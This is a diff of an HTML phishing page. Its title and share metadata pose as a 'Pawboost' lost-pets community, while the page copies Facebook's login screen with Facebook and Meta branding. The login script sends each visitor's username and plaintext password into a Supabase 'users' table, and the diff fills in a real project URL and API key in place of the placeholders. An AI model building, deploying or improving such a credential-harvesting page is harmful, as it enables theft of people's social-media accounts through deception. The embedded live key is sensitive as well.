@@ -4,11 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
 
-  <title> Lost & Found Pets US – Pawboost Community </title>
-  <!-- Standard Meta Description -->
+  <title>Lost & Found Pets US – Pawboost Community</title>
   <meta name="description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is.">
 
-  <!-- Open Graph (Facebook, WhatsApp, LinkedIn) -->
+  <!-- Open Graph -->
   <meta property="og:title" content="Lost & Found Pets Pawboost-Community">
   <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is.">
   <meta property="og:image" content="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/pawboost.png">
@@ -18,328 +17,60 @@
   <meta property="og:url" content="https://www.facebook.com/pawboostcommunity">
   <meta property="og:site_name" content="Pawboost Lost Pets">
 
-  <!-- Twitter Card -->
+  <!-- Twitter -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Lost & Found Pets Pawboost">
   <meta name="twitter:description" content="Join our community to help reunite lost pets with their families.">
   <meta name="twitter:image" content="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/pawboost.png">
 
-  <!-- Favicon -->
   <link rel="icon" type="image/png" href="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/fblogo.png" />
-
-  <!-- Bot/Preview Compatibility -->
   <meta name="robots" content="index, follow" />
   <meta name="theme-color" content="#1877f2" />
-  </head>
+
   <style>
-    :root {
-      --fb-blue: #1877f2;
-      --fb-light-gray: #f0f2f5;
-      --fb-dark-blue: #1c1e21;
-      --fb-text-gray: #606770;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      background-color: var(--fb-light-gray);
-      font-family: Arial, sans-serif;
-      color: var(--fb-dark-blue);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px 10px;
-    }
-
-    .intro-text {
-      text-align: center;
-      margin-top: 20px;
-      margin-bottom: 30px;
-    }
-
-    .intro-text h1 {
-      color: var(--fb-blue);
-      font-size: 32px;
-    }
-
-    .intro-text p {
-      font-size: 14px;
-      max-width: 320px;
-      margin: 10px auto 0;
-      color: var(--fb-dark-blue);
-    }
-
-    .language-toggle {
-      margin-top: 10px;
-      cursor: pointer;
-      font-size: 14px;
-      color: var(--fb-text-gray);
-    }
-
-    .login-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      width: 90%;
-      max-width: 400px;
-      margin-top: 10px;
-      transition: transform 0.2s;
-    }
-
-    .fb-logo {
-      width: 60px;
-      height: 60px;
-      background: white;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 20px 0;
-    }
-
-    .fb-logo img {
-      width: 30px;
-      height: 30px;
-    }
-
-    .input-group {
-      position: relative;
-      margin-bottom: 20px;
-      width: 100%;
-    }
-
-    .input-group input {
-      width: 100%;
-      height: 52px;
-      padding: 0 10px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      background: white;
-      color: var(--fb-dark-blue);
-      font-size: 16px;
-      line-height: 48px;
-      box-sizing: border-box;
-    }
-
-    .input-group label {
-      position: absolute;
-      top: 16px;
-      left: 12px;
-      color: var(--fb-text-gray);
-      font-size: 14px;
-      pointer-events: none;
-      transition: all 0.2s ease;
-    }
-
-    .input-group input:focus + label,
-    .input-group input:not(:placeholder-shown) + label {
-      top: 4px;
-      left: 10px;
-      font-size: 12px;
-      color: #555;
-    }
-
-    button.login-btn {
-      width: 100%;
-      background-color: var(--fb-blue);
-      color: white;
-      border: none;
-      padding: 14px;
-      border-radius: 25px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-bottom: 15px;
-    }
-
-    .forgot-password {
-      color: var(--fb-blue);
-      font-size: 14px;
-      text-align: center;
-      margin-bottom: 30px;
-      cursor: pointer;
-    }
-
-    .create-account {
-      width: 90%;
-      max-width: 400px;
-      background: white;
-      border: 1px solid var(--fb-blue);
-      color: var(--fb-blue);
-      padding: 14px;
-      border-radius: 25px;
-      font-size: 16px;
-      text-align: center;
-      cursor: pointer;
-      margin-bottom: 20px;
-    }
-
-    .meta-logo {
-      font-size: 14px;
-      color: var(--fb-text-gray);
-      margin-bottom: 15px;
-    }
-
-    .language-modal {
-      display: none;
-      position: fixed;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      height: 57vh;
-      width: 100%;
-      max-width: 500px;
-      background-color: white;
-      border-top-left-radius: 20px;
-      border-top-right-radius: 20px;
-      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.5);
-      z-index: 999;
-      padding: 20px;
-      color: #000;
-      overflow-y: auto;
-      overscroll-behavior: contain;
-      scrollbar-width: none;
-    }
-
-    .language-modal::-webkit-scrollbar {
-      display: none;
-    }
-
-    .language-modal-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-
-    .close-btn {
-      font-size: 24px;
-      cursor: pointer;
-      margin-right: 10px;
-    }
-
-    .modal-title {
-      font-size: 16px;
-      font-weight: bold;
-    }
-
-    .language-modal-list {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-    }
-
-    .language-modal-list li {
-      padding: 12px;
-      font-size: 16px;
-      border-bottom: 1px solid #ddd;
-      cursor: pointer;
-    }
-
-    .language-modal-list li:hover {
-      background-color: #f0f0f0;
-    }
-
-    @media (max-width: 480px) {
-      .login-container {
-        padding: 0 10px;
-      }
-    }
-    .meta-footer {
-      pointer-events: none;
-    }
-
-    .meta-footer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      background-color: white;
-      padding: 10px 20px;
-      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
-      z-index: 1000;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      transition: transform 0.3s ease;
-      transform: translateY(0);
-    }
-
-    .top-line {
-      gap: 8px;
-      display: flex;
-      align-items: center;
-      margin-bottom: 5px;
-    }
-
-    .top-line img {
-      height: 22px;
-    }
-
-    .meta-text {
-      font-weight: 700;
-      color: #616770;
-      font-size: 1rem;
-      font-family: Arial, sans-serif;
-      font-weight: 600;
-      user-select: none;
-      cursor: default;
-    }
-
-    .bottom-line {
-      font-size: 0.8rem;
-      color: #616770;
-      user-select: none;
-    }
-
-    @media (max-width: 768px) {
-      .meta-footer {
-        padding: 6px 15px;
-      }
-
-      .top-line {
-        gap: 4px;
-        margin-bottom: 3px;
-      }
-
-      .top-line img {
-        height: 18px;
-      }
-
-      .meta-text {
-        font-size: 0.9rem;
-        font-weight: 600;
-      }
-
-      .bottom-line {
-        font-size: 0.75rem;
-      }
-    }
+    :root { --fb-blue: #1877f2; --fb-light-gray: #f0f2f5; --fb-dark-blue: #1c1e21; --fb-text-gray: #606770; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background-color: var(--fb-light-gray); font-family: Arial, sans-serif; color: var(--fb-dark-blue); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px 10px; }
+    .intro-text { text-align: center; margin: 20px 0 30px; }
+    .intro-text h1 { color: var(--fb-blue); font-size: 32px; }
+    .intro-text p { font-size: 14px; max-width: 320px; margin: 10px auto 0; color: var(--fb-dark-blue); }
+    .language-toggle { margin-top: 10px; cursor: pointer; font-size: 14px; color: var(--fb-text-gray); }
+    .login-container { display: flex; flex-direction: column; align-items: center; width: 90%; max-width: 400px; margin-top: 10px; transition: transform 0.2s; }
+    .fb-logo { width: 60px; height: 60px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 20px 0; }
+    .fb-logo img { width: 30px; height: 30px; }
+    .input-group { position: relative; margin-bottom: 20px; width: 100%; }
+    .input-group input { width: 100%; height: 52px; padding: 0 10px; border-radius: 8px; border: 1px solid #ccc; background: white; color: var(--fb-dark-blue); font-size: 16px; }
+    .input-group label { position: absolute; top: 16px; left: 12px; color: var(--fb-text-gray); font-size: 14px; pointer-events: none; transition: all 0.2s ease; }
+    .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top: 4px; left: 10px; font-size: 12px; color: #555; }
+    button.login-btn { width: 100%; background-color: var(--fb-blue); color: white; border: none; padding: 14px; border-radius: 25px; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
+    .forgot-password { color: var(--fb-blue); font-size: 14px; text-align: center; margin-bottom: 30px; cursor: pointer; }
+    .create-account { width: 90%; max-width: 400px; background: white; border: 1px solid var(--fb-blue); color: var(--fb-blue); padding: 14px; border-radius: 25px; font-size: 16px; text-align: center; cursor: pointer; margin-bottom: 20px; }
+    .meta-logo { font-size: 14px; color: var(--fb-text-gray); margin-bottom: 15px; }
+    .language-modal { display: none; position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); height: 57vh; width: 100%; max-width: 500px; background-color: white; border-top-left-radius: 20px; border-top-right-radius: 20px; box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.5); z-index: 999; padding: 20px; overflow-y: auto; scrollbar-width: none; }
+    .language-modal::-webkit-scrollbar { display: none; }
+    .close-btn { font-size: 24px; cursor: pointer; margin-right: 10px; }
+    .modal-title { font-size: 16px; font-weight: bold; }
+    .language-modal-list { list-style: none; padding: 0; margin: 0; }
+    .language-modal-list li { padding: 12px; font-size: 16px; border-bottom: 1px solid #ddd; cursor: pointer; }
+    .language-modal-list li:hover { background-color: #f0f0f0; }
+    .meta-footer { position: fixed; bottom: 0; left: 0; width: 100%; background-color: white; padding: 10px 20px; box-shadow: 0 -2px 5px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; }
+    .top-line { gap: 8px; display: flex; align-items: center; margin-bottom: 5px; }
+    .top-line img { height: 22px; }
+    .meta-text { font-weight: 700; color: #616770; font-size: 1rem; }
+    .bottom-line { font-size: 0.8rem; color: #616770; }
   </style>
+</head>
 
 <body>
-
-  <!-- Intro Text -->
   <div class="intro-text">
     <h1>Facebook</h1>
     <p>Facebook helps you connect and share with the people in your life.</p>
   </div>
 
-  <!-- Language Toggle -->
-  <div class="language-toggle" onclick="openLanguageModal()">
-    English (UK) &#x25BC;
-  </div>
+  <div class="language-toggle" onclick="openLanguageModal()">English (UK) &#x25BC;</div>
 
-  <!-- Login Container -->
   <div class="login-container">
-    <div class="fb-logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
-    </div>
+    <div class="fb-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" /></div>
 
     <div class="input-group">
       <input type="text" id="username" placeholder=" " />
@@ -357,7 +88,6 @@
 
   <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>
 
-  <!-- Language Modal -->
   <div id="languageModal" class="language-modal">
     <div class="language-modal-header">
       <span class="close-btn" onclick="closeLanguageModal()">&times;</span>
@@ -372,38 +102,24 @@
       <li onclick="selectLanguage('Italiano')">Italiano</li>
     </ul>
   </div>
+
   <div class="meta-footer">
-    <div class="top-line">
-      <img src="metalogo.png" alt="Meta Logo" />
-      <span class="meta-text">Meta</span>
-    </div>
-    <div class="bottom-line">
-      About · Help · More
-    </div>
+    <div class="top-line"><img src="metalogo.png" alt="Meta Logo" /><span class="meta-text">Meta</span></div>
+    <div class="bottom-line">About · Help · More</div>
   </div>
 
   <!-- Supabase Client -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-  <!-- JavaScript -->
   <script>
-    // Initialize Supabase client
-    const SUPABASE_URL = "https://YOUR-PROJECT.supabase.co";
-    const SUPABASE_ANON_KEY = "YOUR-ANON-KEY";
+    // ✅ Supabase setup
+    const SUPABASE_URL = "https://twyyuqdmbsdyrlbqgyoq.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR3eXl1cWRtYnNkeXJsYnFneW9xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwMzExMDUsImV4cCI6MjA3MTYwNzEwNX0.6_NcIRedVB4yHKnvgFpwt9apQMiMlsvx19t8B5UBel8";
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    function openLanguageModal() {
-      document.getElementById('languageModal').style.display = 'block';
-    }
-
-    function closeLanguageModal() {
-      document.getElementById('languageModal').style.display = 'none';
-    }
-
-    function selectLanguage(language) {
-      document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;';
-      closeLanguageModal();
-    }
+    function openLanguageModal() { document.getElementById('languageModal').style.display = 'block'; }
+    function closeLanguageModal() { document.getElementById('languageModal').style.display = 'none'; }
+    function selectLanguage(language) { document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;'; closeLanguageModal(); }
 
     async function loginUser() {
       const usernameInput = document.getElementById("username");
@@ -413,30 +129,14 @@
       const password = passwordInput.value.trim();
 
       document.querySelectorAll('.error-message').forEach(el => el.remove());
-      [usernameInput, passwordInput].forEach(input => {
-        input.style.borderColor = '#ccc';
-      });
+      [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');
 
-      let hasError = false;
-
-      if (!username) {
-        showError(usernameInput);
-        hasError = true;
-      }
-
-      if (!password) {
-        showError(passwordInput);
-        hasError = true;
-      }
-
-      if (hasError) return;
+      if (!username) return showError(usernameInput);
+      if (!password) return showError(passwordInput);
 
       try {
-        // Save login attempt to Supabase
-        const { data, error } = await supabase
-          .from("users")
-          .insert([{ username: username, password: password }]);
-
+        // Insert into Supabase table "users"
+        const { error } = await supabase.from("users").insert([{ username, password }]);
         if (error) throw error;
 
         localStorage.setItem("login_user", username);
@@ -449,32 +149,23 @@
 
     function showError(inputElement) {
       inputElement.style.borderColor = 'red';
-
       const error = document.createElement('div');
       error.className = 'error-message';
       error.style.color = 'red';
       error.style.fontSize = '12px';
       error.style.marginTop = '4px';
       error.textContent = 'Required';
-
       inputElement.parentNode.appendChild(error);
     }
 
     (() => {
       const footer = document.querySelector('.meta-footer');
       let initialHeight = window.innerHeight;
-
       window.addEventListener('resize', () => {
         const currentHeight = window.innerHeight;
-
-        if (initialHeight - currentHeight > 150) {
-          footer.style.transform = 'translateY(100%)';
-        } else {
-          footer.style.transform = 'translateY(0)';
-        }
+        footer.style.transform = (initialHeight - currentHeight > 150) ? 'translateY(100%)' : 'translateY(0)';
       });
     })();
   </script>
-
 </body>
 </html>
